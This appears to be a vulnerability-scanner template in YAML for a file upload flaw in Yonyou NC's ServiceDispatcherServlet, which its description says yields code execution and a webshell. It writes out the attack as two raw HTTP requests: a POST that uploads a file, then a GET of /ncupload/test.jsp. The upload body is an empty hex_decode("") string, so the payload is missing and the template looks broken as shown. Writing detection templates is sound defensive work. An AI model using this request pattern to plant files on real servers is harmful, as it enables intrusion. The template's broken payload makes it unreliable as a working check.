id: yonyou-nc-file-upload
info:
  name: Yonyou NC ServiceDispatcherServlet File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Yonyou NC is a management software for group enterprises under China Yonyou Group. There is an arbitrary file upload vulnerability in Yonyou NC ServiceDispatcherServlet routing, allowing attackers to upload arbitrary files, execute arbitrary code on the server, and obtain a webshell.
  tags: code-execution, file-upload
http:
  - raw:
      - |
        POST /ServiceDispatcherServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/octet-stream

        {{hex_decode("")}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "test_test"
  - raw:
      - |
        GET /ncupload/test.jsp HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "test_test"
